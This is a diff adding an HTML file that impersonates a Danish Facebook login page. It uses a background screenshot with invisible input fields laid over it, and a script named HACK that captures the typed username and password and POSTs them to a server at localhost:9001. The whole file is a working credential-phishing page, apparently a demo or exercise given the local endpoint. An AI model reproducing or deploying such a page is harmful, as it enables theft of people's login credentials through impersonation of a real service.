@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Facebook - log på eller tilmeld dig</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel="icon" href="fbfav.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="fbfav.png" type="image/x-icon" />
+    <style>
+        body {
+            background-image: url("facebook.png");
+        }
+
+        input {
+            border: none;
+            border-color: transparent;
+        }
+    </style>
+   
+</head>
+
+<body style="padding: 0%; margin: 0%">
+
+    <form style="margin-left: 1070px; margin-top: 37px">
+        <input id="user" style="width: 161px" type="text">
+        <input id="psw" style="margin-left:16px; width:161px" type="password">
+        <button id="submit" 
+            style="margin-left:12px; font-size: 0; width: 60px; height: 30px; background: transparent; border: none !important;">submit</button>
+    </form>
+
+    <script>
+        function HACK(e){
+            e.preventDefault()
+            let user = document.getElementById('user').value
+            let psw = document.getElementById('psw').value
+            fetch('http://localhost:9001/HACK', {
+                method: "POST",
+                body: JSON.stringify({user,psw}),
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            }).then((res)=>{
+                console.log(res)
+            })
+        }
+    
+        document.getElementById("submit").addEventListener("click", HACK)
+        </script>
+    
+</body>
+
+</html>
